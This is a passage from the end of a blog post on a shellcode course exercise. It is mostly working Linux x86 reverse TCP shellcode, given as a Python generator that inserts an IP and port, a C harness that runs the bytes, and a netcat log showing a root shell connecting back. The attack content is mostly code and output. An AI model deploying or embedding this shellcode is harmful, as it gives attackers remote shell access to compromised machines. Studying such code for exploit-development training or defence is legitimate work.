    <span class="n">formatted</span>       <span class="o">=</span> <span class="p">[</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">'x'</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">filtered</span><span class="p">]</span>
    <span class="n">port</span>            <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">formatted</span><span class="p">)</span>
    
    <span class="n">shellcode</span> <span class="o">=</span><span class="s">"</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb9"</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Ip is: "</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">shellcode</span><span class="o">+=</span> <span class="n">ip</span> <span class="c"># "\\x80\\x01\\x01\\x02"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x81</span><span class="se">\\</span><span class="s">xe9</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x68"</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Port is: "</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
    <span class="n">shellcode</span><span class="o">+=</span> <span class="n">port</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x43</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x89"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">x51</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">x43</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb1</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x3f</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x49</span><span class="se">\\</span><span class="s">x79</span><span class="se">\\</span><span class="s">xf9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x53</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f"</span>
    <span class="n">shellcode</span><span class="o">+=</span><span class="s">"</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x73</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x69</span><span class="se">\\</span><span class="s">x6e</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80"</span><span class="p">;</span>
    
    <span class="k">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span></code></pre></figure>

<p>Pop it in our shellcode.c program again:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#include&lt;stdio.h&gt;
</span>    <span class="cp">#include&lt;string.h&gt;
</span>    
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
    <span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80</span><span class="s">\x1\x1\x2"</span>
    <span class="s">"</span><span class="se">\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>
    
    <span class="n">main</span><span class="p">()</span>
    <span class="p">{</span>
    
      <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
    
      <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    
      <span class="n">ret</span><span class="p">();</span>
    
    <span class="p">}</span></code></pre></figure>

<p>Setup our netcat listener and:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    root@funos:~/shared/SLAE/slae/exercise2# nc <span class="nt">-nlvp</span> 4444
    listening on <span class="o">[</span>any] 4444 ...
    connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 37311
    id
    <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>

<p>Presto! We have a reverse shell connection!</p>

          </div>

          <div class="article-share">
            
            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 2: Reverse TCP Shellcode - http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
              <span class="icon icon-social-twitter"></span>
            </a>
            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=500, height=500'); return false;">
              <span class="icon icon-social-facebook"></span>
            </a>
            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=550, height=400'); return false;">
              <span class="icon icon-social-googleplus"></span>
            </a>
          </div>

          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
          </a>
          <a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert" target="_blank">
            <img src="/assets/offsec-student-certified-emblem-rgb-osce.png"" />
          </a>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script>
              (function() {
                  var d = document, s = d.createElement('script');
                  s.src = '//blischalkblog.disqus.com/embed.js';
                  s.setAttribute('data-timestamp', +new Date());
                  (d.head || d.body).appendChild(s);
              })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
          
        </article>
        <footer class="footer reveal">
  <p>
    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
  </p>
</footer>

      </div>
    </div>
  </main>
  <script type="text/javascript" src="/assets/vendor.js"></script>
<script type="text/javascript" src="/assets/application.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
<script>
  WebFont.load({
    google: {
      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
    }
  });
</script>


  <script>
    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
    ga('create','UA-4121143-2','auto');ga('send','pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>


</body>
</html>
